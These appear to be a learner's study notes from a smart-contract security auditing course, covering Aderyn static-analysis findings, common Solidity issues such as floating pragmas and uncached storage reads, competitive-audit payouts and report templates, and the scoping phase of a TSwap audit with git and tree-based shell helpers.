	- Instead, we should save it as a variable
```js
for (uint256 i = 0; i < players.length; i++) {
	if (players[i] == player) {
		return i;
	}
}
```

### Aderyn Walkthrough
- `aderyn` to run aderyn... produces a readme
- points out issues that we should review
```
- [High Issues](#high-issues)

  - [H-1: `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#h-1-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256)

- [Low Issues](#low-issues)

  - [L-1: Centralization Risk for trusted owners](#l-1-centralization-risk-for-trusted-owners)

  - [L-2: Solidity pragma should be specific, not wide](#l-2-solidity-pragma-should-be-specific-not-wide)

  - [L-3: Missing checks for `address(0)` when assigning values to address state variables](#l-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)

  - [L-4: `public` functions not used internally could be marked `external`](#l-4-public-functions-not-used-internally-could-be-marked-external)

  - [L-5: Define and use `constant` variables instead of using literals](#l-5-define-and-use-constant-variables-instead-of-using-literals)

  - [L-6: Event is missing `indexed` fields](#l-6-event-is-missing-indexed-fields)

  - [L-7: Loop contains `require`/`revert` statements](#l-7-loop-contains-requirerevert-statements)
```

### Test Coverage
- For a competitive audit, test coverage doesn't matter???
- For a private audit, use it as informational

### Phase 4: Reporting primer
- We can always look at one more line of code, but at some point, you have to write the report
- Writing a report is almost a sales job... you have to sell the idea of your bug... if it isn't convincing, you may not get paid

### What is a competitive audit?
For competitive audits, the payouts are currently determined as:
- **Medium Risk Shares**: `1 * (0.9^(findingCount - 1)) / findingCount`
- **High Risk Shares**: `5 * (0.9^(findingCount - 1)) / findingCount`
This calculation is subject to future adjustments to align with auditors needs.

- The more people that report the same issue, the less the payout will be
	- The idea is to reward unique bugs the most... if many people find the same bug, then it's not very hard to spot, so it doesn't pay as much.

### Submitting a competitive audit finding
- Submitting bugs varies based on the platform being used
- Codehawks will have you choose a title, severity, and relevant github links
- Codehawks also has the following suggesting format for the free write finding secton:
```
## Summary

## Vulnerability Details

## Impact

## Tools Used

## Recommendations
```
- For a competitive audit, PoC will almost always be mandatory
- When many people report the same finding, the selected submission will get the bigger payout... so quality of finding reports is important

### Reporting templates
- [Audit Report Templating](https://github.com/Cyfrin/audit-report-templating/)
- [Github Report Templating (Cyfrin)](https://github.com/Cyfrin/audit-repo-cloner)
- [Github Report Templating (Spearbit)](https://github.com/spearbit-audits/report-generator-template)
- [Github Report Templating (Spearbit Custom)](https://github.com/Cyfrin/report-generator-template)

### Issues to keep in mind
- Populate the files you audit with `//@audit` tags... search for them later as you review the codebase
	- After you address these tags, you cant leave additional tags like `//report written` to keep track of the issues you have already dealt with

- Use of floating pragma is bad
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
```
- The floating pragma is the `^` symbol... don't use it and stick to a specific compiler version

- Incorrect solc versions
```
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
```
- Look for older compiler versions, especially ones before `0.8.0`
	- Best practice is to use the latest version and using versions older than `0.8.0` suffer from overflow/underflow

- Unchanged state variables should be immutable or constant

- Make sure relevant functions have `address(0)` checks

- Storage variables in loops should be cached
```diff
+ uint256 playerLength = players.length;
 
function getActivePlayerIndex(address player) external view returns (uint256) {
-	for (uint256 i = 0; i < players.length; i++) {
+	for (uint256 i = 0; i < playerLength; i++) {
		if (players[i] == player) {
			return i;
		}
	}
	return 0;
}
```
- `players.length` is constantly read from storage... if it's stored as a variable instead, it will save gas by reading from memory

- In a competitive audit, a "duplicate" submission shares the same "root cause" as another submission

- Magic numbers
	- It can be confusing to see number literals in a codebase
	- It is much more readable if numbers are given a name

- Pull over Push
	- Ideally, you want user to pull their money out rather than push it to them
	- If you have to push the money, then you can run into intended consequences (no fallback, etc.)


## [TSwap](https://youtu.be/pUWmJ86X_do?t=15924)
[repo](https://github.com/Cyfrin/5-t-swap-audit)

### Introduction
- The objective in this section is to find bugs without looking at the code???
- Concepts:
	- Stateful fuzzing
	- Fuzzing
	- Invariants
	- FREI-PI/CEII
	- Advanced DeFi
	- AMMs
	- Uniswap
	- Curve.fi
	- Constant product formula
- The codebase being reviewd, TSwap, is similar to Uniswap V1

### Phase 1 Scoping
- [Extensive onboarding](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/extensive-onboarding-questions.md)
- normally you want to: 
	- `git checkout <commit hash>`
	- `git branch`
	- `git diff <hash from previous command> main` (check difference between branches)
	- `git stash` ->`git checkout main` if you want to go back to main???
- there are two make commands
```make
scope :; tree ./src/ | sed 's/└/#/g; s/──/--/g; s/├/#/g; s/│ /|/g; s/│/|/g'

scopefile :; @tree ./src/ | sed 's/└/#/g' | awk -F '── ' '!/\.sol$$/ { path[int((length($$0) - length($$2))/2)] = $$2; next } { p = "src"; for(i=2; i<=int((length($$0) - length($$2))/2); i++) if (path[i] != "") p = p "/" path[i]; print p "/" $$2; }' > scope.txt
```
- to get this to work i had to `choco install tree`

- [tswap onboarded](https://github.com/Cyfrin/5-t-swap-audit/blob/main/t-swap-onboarded.md):

| Current Status                                                      |                                               |
| ------------------------------------------------------------------- | --------------------------------------------- |
| Is the project a fork of the existing protocol                      | Yes (but for the course we are pretending no) |
| Specify protocol (only if Yes for prev question)                    | UniswapV1                                     |
| Does the project use rollups?                                       | No                                            |
| Will the protocol be multi-chain?                                   | No                                            |
| Specify chain(s) on which protocol is/ would be deployed            | ETH                                           |
| Does the protocol use external oracles?                             | No                                            |
| Does the protocol use external AMMs?                                | No                                            |
| Does the protocol use zero-knowledge proofs?                        | No                                            |
| Which ERC20 tokens do you expect to interact with smart contracts   | All                                           |
| Which ERC721 tokens do you expect to interact with smart contracts? | None                                          |
| Are ERC777 tokens expected to interact with protocol?               | Any                                           |
| Are there any off-chain processes (keeper bots etc.)                | No                                            |
| If yes to the above, please explain                                 |                                               |

- Whether in a private or competitive setting, always ask the developers questions

### Phase 2: Recon
- Start by reading the docs and diagramming
	- Sometimes, you can help the protocol by creating a diagram